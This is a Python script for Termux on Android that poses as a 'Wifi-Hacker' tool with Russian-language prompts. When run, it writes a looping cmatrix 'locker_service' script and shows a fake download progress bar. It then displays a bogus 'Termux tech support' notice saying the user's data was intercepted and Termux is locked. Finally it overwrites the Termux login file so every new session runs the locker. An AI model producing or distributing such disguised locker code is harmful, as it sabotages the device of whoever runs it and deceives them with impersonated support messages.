import time
import os
import sys
from colorama import Fore
os.system('clear')
file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
file.write("""
import os
os.system('pkg install cmatrix')
while True:
	os.system('cmatrix')
""")
file.close()
os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
print(Fore.RED)
os.system('toilet -f pagga Wifi-Hacker')
print(Fore.WHITE)
print('Welcome. Спасибо, за то что используете наш инструмент.')
print()
print('Начать попытку взлома уязвимых wifi сетей в вашем местоположении?')

while True:
 a = input('Ввод ответа (Да/Нет): ').lower().strip()
 if a == 'да':
 	break
 if a == 'нет':
 	print('Пока :(')
 	sys.exit()
 else:
 	print('Вы ввели что-то не то.')
print(Fore.GREEN + 'Скачивание данных...')
print()
for percent in range(101):
   s = Fore.GREEN + f"[{(percent // 10) * '■'*4}"
   s += Fore.WHITE + f"{(10 - (percent // 10)) * '■'*4}" + Fore.GREEN +']'
   s += Fore.WHITE + f" {percent}" + '%'
   print(s, end="\r")
   time.sleep(0.1)
print()
print(Fore.GREEN + 'Process finished.')

print(Fore.GREEN)
print()
print()
print('         © Тех.поддержка инструмента Termux')
print()
print('Здравствуйте, уважаемый пользователь. Спешим сообщить, что ваши данные были перехвачены с неизвестного устройста на базе Windows 10.')
print()
print('Просим вас сменить все пароли, а также обратиться к нам на прямую.')
print()
print('Для вашей безопастности пропишите 2 раза команду: "exit".')
print()
print('Ваш Termux заблокирован.\n © Тех.поддержка инструмента Termux.')
file = open('/data/data/com.termux/files/usr/bin/login', 'w')
file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
file.close()
